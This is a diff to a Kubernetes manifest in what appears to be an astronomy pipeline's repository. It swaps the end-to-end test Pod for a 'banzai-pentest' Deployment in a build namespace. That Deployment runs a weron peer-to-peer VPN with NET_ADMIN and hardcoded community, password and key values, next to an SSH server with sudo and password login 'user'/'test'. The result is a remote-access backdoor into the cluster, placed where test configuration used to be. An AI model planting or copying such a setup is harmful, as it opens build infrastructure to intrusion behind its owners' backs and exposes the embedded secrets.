@@ -1,213 +1,50 @@
-apiVersion: v1
-kind: Pod
+# yaml-language-server: $schema=https://raw.githubusercontent.com/yannh/kubernetes-json-schema/master/v1.22.17-standalone/deployment-apps-v1.json
+
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: banzai-e2e-test
+  name: banzai-pentest
   namespace: build
-  labels:
-    app.kubernetes.io/name: banzai
 spec:
-  # Create some empty directories to be mounted within the Pod
-  volumes:
-    - name: banzai-data
-      emptyDir:
-        sizeLimit: 10Gi
-  securityContext:
-    fsGroup: 10000
-
-  initContainers:
-    # When the Pod is initialized, copy all files within the container at path
-    # /archive/engineering into the empty data volume mounted at /data
-    - name: banzai-data
-      image: docker.lco.global/banzai-e2e-data:1.4.2
-      imagePullPolicy: IfNotPresent
-      securityContext:
-        runAsUser: 10087
-        runAsGroup: 10000
-      volumeMounts:
-        - name: banzai-data
-          mountPath: /data
-          readOnly: false
-      command:
-        - /bin/cp
-        - -a
-        - /archive/engineering
-        - /data/
-      resources:
-        requests:
-          cpu: 0.1
-          memory: 256M
-        limits:
-          cpu: 1
-          memory: 1Gi
-
-  containers:
-    - name: banzai-redis
-      image: redis:5.0.3
-      imagePullPolicy: IfNotPresent
-      resources:
-        requests:
-          cpu: 0.1
-          memory: 256M
-        limits:
-          cpu: 1
-          memory: 1Gi
-      readinessProbe:
-        exec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: banzai-pentest
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: banzai-pentest
+    spec:
+      containers:
+        - name: weron
+          image: ghcr.io/pojntfx/weron
+          securityContext:
+            capabilities:
+              add:
+                - "NET_ADMIN"
           command:
-            - redis-cli
-            - ping
-            - |
-            - grep
-            - "PONG"
-        initialDelaySeconds: 5
-        periodSeconds: 1
-    - name: banzai-fits-exchange
-      image: rabbitmq:3.7.9
-      imagePullPolicy: IfNotPresent
-      resources:
-        requests:
-          cpu: 1
-          memory: 512M
-        limits:
-          cpu: 2
-          memory: 1Gi
-      readinessProbe:
-        exec:
-          command:
-            - rabbitmqctl
-            - node_health_check
-        initialDelaySeconds: 5
-        periodSeconds: 1
-        timeoutSeconds: 10
-    - name: banzai-celery-workers
-      image: @BANZAI_IMAGE@
-      imagePullPolicy: IfNotPresent
-      volumeMounts:
-        - name: banzai-data
-          mountPath: /archive/engineering
-          subPath: engineering
-          readOnly: false
-      env:
-        - name: DB_ADDRESS
-          value: "sqlite:////archive/engineering/test.db"
-        - name: RETRY_DELAY
-          value: "0"
-        - name: TASK_HOST
-          value: "redis://localhost:6379/0"
-        - name: BANZAI_WORKER_LOGLEVEL
-          value: debug
-        - name: CALIBRATE_PROPOSAL_ID
-          value: "calibrate"
-        - name: OBSERVATION_PORTAL_URL
-          value: "http://internal-observation-portal.lco.gtn/api/observations/"
-        - name: OMP_NUM_THREADS
-          value: "4"
-        - name: FITS_EXCHANGE
-          value: "fits_files"
-        - name: OPENTSDB_PYTHON_METRICS_TEST_MODE
-          value: "1"
-        - name: CELERY_TASK_QUEUE_NAME
-          value: "e2e_task_queue"
-        - name: REFERENCE_CATALOG_URL
-          value: "http://phot-catalog.lco.gtn/"
-      command:
-        - celery
-        - -A
-        - banzai
-        - worker
-        - --hostname
-        - "banzai-celery-worker"
-        - --concurrency
-        - "4"
-        - -l
-        - "debug"
-        - "-Q"
-        - "$(CELERY_TASK_QUEUE_NAME)"
-      readinessProbe:
-        exec:
-          command:
-            - celery
-            - -A
-            - banzai
-            - status
-            - |
-            - grep
-            - "banzai-celery-worker:.*OK"
-        initialDelaySeconds: 5
-        periodSeconds: 1
-        timeoutSeconds: 10
-      resources:
-        requests:
-          cpu: 6
-          memory: 6Gi
-        limits:
-          cpu: 8
-          memory: 8Gi
-    - name: banzai-celery-beat
-      image: @BANZAI_IMAGE@
-      imagePullPolicy: IfNotPresent
-      volumeMounts:
-        - name: banzai-data
-          mountPath: /archive/engineering
-          subPath: engineering
-          readOnly: false
-      env:
-        - name: DB_ADDRESS
-          value: "sqlite:////archive/engineering/test.db"
-        - name: RETRY_DELAY
-          value: "0"
-        - name: TASK_HOST
-          value: "redis://localhost:6379/0"
-        - name: CELERY_TASK_QUEUE_NAME
-          value: "e2e_task_queue"
-      command:
-        - banzai_automate_stack_calibrations
-      resources:
-        requests:
-          cpu: 0.1
-          memory: 1Gi
-        limits:
-          cpu: 1
-          memory: 1Gi
-    - name: banzai-listener
-      image: @BANZAI_IMAGE@
-      imagePullPolicy: IfNotPresent
-      volumeMounts:
-        - name: banzai-data
-          mountPath: /archive/engineering
-          subPath: engineering
-          readOnly: false
-      env:
-        - name: DB_ADDRESS
-          value: "sqlite:////archive/engineering/test.db"
-        - name: FITS_BROKER
-          value: "localhost"
-        - name: TASK_HOST
-          value: "redis://localhost:6379/0"
-        - name: CALIBRATE_PROPOSAL_ID
-          value: "calibrate"
-        - name: OBSERVATION_PORTAL_URL
-          value: "http://internal-observation-portal.lco.gtn/api/observations/"
-        - name: FITS_EXCHANGE
-          value: "fits_files"
-        - name: OPENTSDB_PYTHON_METRICS_TEST_MODE
-          value: "1"
-        - name: CELERY_TASK_QUEUE_NAME
-          value: "e2e_task_queue"
-        - name: REFERENCE_CATALOG_URL
-          value: "http://phot-catalog.lco.gtn/"
-      command:
-        - banzai_run_realtime_pipeline
-        - "--db-address=sqlite:////archive/engineering/test.db"
-        - "--fpack"
-        - "--broker-url=localhost"
-      resources:
-        requests:
-          cpu: 0.1
-          memory: 1Gi
-        limits:
-          cpu: 1
-          memory: 2Gi
+            - bash
+            - -c
+            - -e
+            - |-
+              mkdir -p /dev/net
+              mknod /dev/net/tun c 10 200
+              chmod 600 /dev/net/tun
+              weron vpn ip \
+                --community "b4rI0e5vQdLLAEX-ShLEJfcTgUgxxbqyeCoVcvrSA1c" \
+                --password "46gsVMW2WyVtjflD2HcLvHIyvNfHcclKA4FxQnYAzAk" \
+                --key "6aknLiVLx8w4zsBIOnopCpDmz64tYVBrvICpdrqRgJ8" \
+                --ips "192.0.2.1/24" \
+                --verbose 6
 
-  dnsPolicy: ClusterFirst
-  restartPolicy: Never
+        - name: sshd
+          image: linuxserver/openssh-server
+          env:
+            - name: SUDO_ACCESS
+              value: "true"
+            - name: PASSWORD_ACCESS
+              value: "true"
+            - name: USER_PASSWORD
+              value: test
+            - name: USER_NAME
+              value: user
